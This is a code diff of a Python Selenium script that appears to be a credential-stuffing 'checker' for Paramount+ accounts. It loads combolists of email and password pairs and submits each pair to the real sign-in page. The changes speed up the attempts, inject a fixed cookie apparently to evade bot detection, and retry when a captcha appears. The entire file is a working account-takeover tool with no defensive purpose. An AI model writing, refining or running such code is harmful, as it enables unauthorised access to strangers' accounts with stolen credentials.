@@ -3,29 +3,26 @@ import time
 from combo_splitters.split_combos import ComboSplitter
 from selenium import webdriver
 from selenium.webdriver.common.by import By
-from selenium.common.exceptions import ElementClickInterceptedException, NoSuchElementException, TimeoutException
+from selenium.common.exceptions import ElementClickInterceptedException, NoSuchElementException
+from selenium.common.exceptions import TimeoutException
 from selenium.webdriver.chrome.options import Options
-from headers.paramount_header import header
+from titles.paramount_title import title
 from modules.connection_error import connection_error_try_block as ip_country
 from pathlib import Path
 
 
 def paramount_():
-	header()
-	file_directory = str(Path(__file__).parents[1])+'/paramount'
+	title()
+	file_directory = str(Path(__file__).parents[1])+'/combolists/paramount'
 	plain_directory = str(Path(__file__).parents[1])
-	page = 'https://www.paramountplus.com/account/flow/f-upsell/action/login/'
-	if 'US' not in str(ip_country()[1]):
-		print('Current Location: {}'.format(ip_country()[1]))
-		print('Please use a US IP to check accounts.\nEnding.')
-		exit()
+	ip_country()
+	page = 'https://www.paramountplus.com/account/signin/'
 	splitter = ComboSplitter(file_directory, "paramount")
 	try:
 		users, passwords = splitter.split_file()
 	except TypeError:
 		splitter.return_error()
 		exit()
-
 	index = 0
 	browser_options = Options()
 	browser_options.add_argument('--user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36')
@@ -37,6 +34,7 @@ def paramount_():
 				browser = webdriver.Chrome(options=browser_options)
 				browser.set_window_size(500, 700)
 				browser.get(page)
+				browser.add_cookie({'name': 'ovvuid', 'value': 'bb7470a9-4e85-4863-b551-8667ea62be6c'})
 				browser.set_page_load_timeout(10)
 				email_input_box = browser.find_element(By.XPATH, '//*[@id="email"]')
 				password_input_box = browser.find_element(By.XPATH, '//*[@id="password"]')
@@ -44,7 +42,7 @@ def paramount_():
 				email_input_box.send_keys(users[index])
 				password_input_box.send_keys(passwords[index])
 				sign_in_button.click()
-				time.sleep(700)
+				time.sleep(5)
 				if browser.find_elements(By.XPATH, '//*[@id="main-aa-container"]/section/div[2]/div[2]/div/div[1]'):
 					print(' -- Error: Captcha. Iteration index not increased'.format(users[index], passwords[index]))
 					continue
